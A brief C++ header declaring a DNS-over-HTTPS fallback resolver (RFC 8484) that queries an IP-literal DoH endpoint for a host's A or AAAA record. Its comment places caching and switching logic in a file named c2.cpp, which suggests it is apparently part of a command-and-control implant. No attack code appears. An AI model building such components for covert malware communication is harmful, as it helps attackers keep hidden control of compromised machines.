#pragma once
#include <string>

// DNS-over-HTTPS resolution fallback (RFC 8484) — implementation in src/doh.cpp.
//
// Resolve() POSTs a raw DNS wire-format query for `hostname` to `endpoint`
// (an https:// DoH URL, IP literal by default) and returns the first usable A
// answer, or the first AAAA answer when no A exists. Empty on any failure.
//
// The function is deliberately stateless: caching, sticky-address policy and
// the on/off switch live in src/c2.cpp next to the transport they modify.
namespace doh {
    std::wstring Resolve(const std::wstring& hostname, const std::wstring& endpoint);
}
